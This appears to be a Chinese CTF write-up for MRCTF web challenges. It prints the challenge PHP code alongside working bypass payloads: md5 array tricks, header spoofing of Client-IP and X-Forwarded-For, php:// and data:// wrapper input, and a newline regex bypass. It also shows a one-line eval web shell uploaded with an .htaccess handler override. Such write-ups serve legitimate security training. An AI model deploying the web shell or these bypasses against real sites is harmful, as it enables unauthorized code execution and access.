@[toc](文章目录)

## Ez_bypass1

打开环境，我们发现直接给了代码

整理过后：

```php
<?php
$flag='MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}';
if(isset($_GET['gg'])&&isset($_GET['id'])) {
    $id=$_GET['id']; $gg=$_GET['gg'];
    if (md5($id) === md5($gg) && $id !== $gg) {
        echo 'You got the first step';
        if(isset($_POST['passwd'])) {
            $passwd=$_POST['passwd'];
            if (!is_numeric($passwd)) {
                if($passwd==1234567) {
                    echo 'Good Job!';
                    highlight_file('flag.php');
                    die('By Retr_0'); }
                else { echo "can you think twice??"; } }
            else{ echo 'You can not get it !'; } }
        else{ die('only one way to get the flag'); } }
    else { echo "You are not a real hacker!"; } }
else{ die('Please input first'); } 
```

就是个简单的php特性绕过

payload

``` 
GET:gg[]=1&id[]=2    绕过md5的很熟悉了

POST:passwd=1234567a 绕过is_numeric()，我们也熟悉，但是可以用脚本
```

脚本内容

```
<?php
for($i=0;$i<=128;$i++){
    $x='1234567'.chr($i);
    if(!is_numeric($x)){
        if($x==1234567){
            echo urlencode($x).'-->';
            echo $x.PHP_EOL;
        }
    }
}
```

## Ez-pop

可以看看我自己的博客

[由MRCTF学习php反序列化--pop链的构造_unexpectedthing的博客-CSDN博客](https://blog.csdn.net/unexpectedthing/article/details/120203484)

##  你传你妈呢

先传一个图片马，可以成功上传

```php
<?php @eval($_POST[1]); ?>
```

再传一个`.htaccess`文件

```php
<FilesMatch "webshell">
SetHandler application/x-httpd-php
</FilesMatch>
```

蚁剑连接，flag在根目录

[关于htaccessd的具体总结](https://blog.csdn.net/solitudi/article/details/116666720?spm=1001.2014.3001.5502)

##  Pywebsite

打开网页，F12发现了js代码

```javascript
function enc(code){
      hash = hex_md5(code);
      return hash;
    }
    function validate(){
      var code = document.getElementById("vcode").value;
      if (code != ""){
        if(hex_md5(code) == "0cd4da0223c0b280829dc3ea458d655c"){
          alert("您通过了验证！");
          window.location = "./flag.php"
        }else{
          alert("你的授权码不正确！");
        }
      }else{
        alert("请输入授权码");
      }
      
    }
```

访问flag.php,得到一个网页，得到一个重要信息，ip地址

我们bp抓包

添加：X-Forwarded-For: 127.0.0.1

就可以得到flag

##  套娃

F12，有代码

```php
<?php
//1st
$query = $_SERVER['QUERY_STRING'];

 if( substr_count($query, '_') !== 0 || substr_count($query, '%5f') != 0 ){
    die('Y0u are So cutE!');
}
 if($_GET['b_u_p_t'] !== '23333' && preg_match('/^23333$/', $_GET['b_u_p_t'])){
    echo "you are going to the next ~";
}
!
```

需要绕过

第一步

```
$_SERVER['QUERY_STRING']:就是去得到GET的参数名
substr_count()，就是去匹配字符串中，对应字符的个数,返回次数
```

我们不能让参数名中有`_`,url编码也不行

我们使用点号`.`和空格可以代替`_`,效果一样的

第二步，绕过preg_match，

```
preg_match:返回0或者1
```

看到正则表达式，因为没有/m，不会多行匹配，只有`^`和`$`，单行匹配

我们可以使用换行符%0a来绕过

这儿有个脚本，直接跑

```php
<?php
for($i=0;$i<=128;$i++){
    $x='23333'.chr($i);
    if($x!=='23333' && preg_match('/^23333$/',$x)){
        echo $i.'-->'.urlencode($x).PHP_EOL;
    }
}
```

然后访问URL为：/secrettw.php 

F12出现了一串编码

这是[JSfuck编码](http://www.hiencode.com/jsfuck.html)

解密后需要我们POST传Merak参数

POST：Merak=1

看到代码

```php
<?php 
error_reporting(0); 
include 'takeip.php';
ini_set('open_basedir','.'); 
include 'flag.php';

if(isset($_POST['Merak'])){ 
    highlight_file(__FILE__); 
    die(); 
} 
function change($v){ 
    $v = base64_decode($v); 
    $re = ''; 
    for($i=0;$i<strlen($v);$i++){ 
        $re .= chr ( ord ($v[$i]) + $i*2 ); 
    } 
    return $re; 
}
echo 'Local access only!'."<br/>";
$ip = getIp();
if($ip!='127.0.0.1')
echo "Sorry,you don't have permission!  Your ip is :".$ip;
if($ip === '127.0.0.1' && file_get_contents($_GET['2333']) === 'todat is a happy day' ){
echo "Your REQUEST is:".change($_GET['file']);
echo file_get_contents(change($_GET['file'])); }
?>
```

又要绕过：

第一个ip地址，这儿我们要用client-ip: 127.0.0.1

file_get_contents(),php伪协议

```
2333=php://input
POST:todat is a happy day
或者
data://text/plain,todat is a happy day
data://text/plain;base64,dG9kYXQgaXMgYSBoYXBweSBkYXk=
```

绕过change函数

exp

```php
<?php
function change($v){
    $re = '';
    for($i=0;$i<strlen($v);$i++){
        $re .= chr ( ord ($v[$i])-$i*2 );
    }
    return $re;
}
$x=change("flag.php");
echo $x.PHP_EOL;
echo base64_encode($x).PHP_EOL;
```

payload

```
?2333=data://text/plain;base64,dG9kYXQgaXMgYSBoYXBweSBkYXk=&file=ZmpdYSZmXGI=
请求头：
    client-ip: 127.0.0.1
```

关于Client-ip和X_Forwarded_For,REMOTE_ADDR

```
Remote-addr
表示发出请求的远程主机的 IP 地址，remote_addr代表客户端的IP，但它的值不是由客户端提供的，而是服务端根据客户端的ip指定的，当你的浏览器访问某个网站时，假设中间没有任何代理，那么网站的web服务器（Nginx，Apache等）就会把remote_addr设为你的机器IP，如果你用了某个代理，那么你的浏览器会先访问这个代理，然后再由这个代理转发到网站，这样web服务器就会把remote_addr设为这台代理机器的IP

x_forwarded_for
简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项，正如上面所述,当你使用了代理时,web服务器就不知道你的真实IP了,为了避免这个情况,代理服务器通常会增加一个叫做x_forwarded_for的头信息,把连接它的客户端IP(即你的上网机器IP)加到这个头信息里,这样就能保证网站的web服务器能获取到真实IP

client-ip: 
是代理服务器发送的HTTP头，HTTP_CLIENT_IP确实存在于http请求的header里

补充：
$_SERVER['REMOTE_ADDR']：这个系统变量是你的客户端跟你的服务器“握手”时候的IP。如果使用了“匿名代理（anonymous）”，REMOTE_ADDR将显示代理服务器的IP。访问端（有可能是用户，有可能是代理的）IP
$_SERVER['HTTP_CLIENT_IP']：是代理服务器发送的HTTP头。如果是“超级匿名代理”，则返回none值。同样，REMOTE_ADDR也会被替换为这个代理服务器的IP。代理端的（有可能存在，可伪造）
```



后面两道题做不来，以后再写吧

##  EZaudit

## Ezpop_Reveng



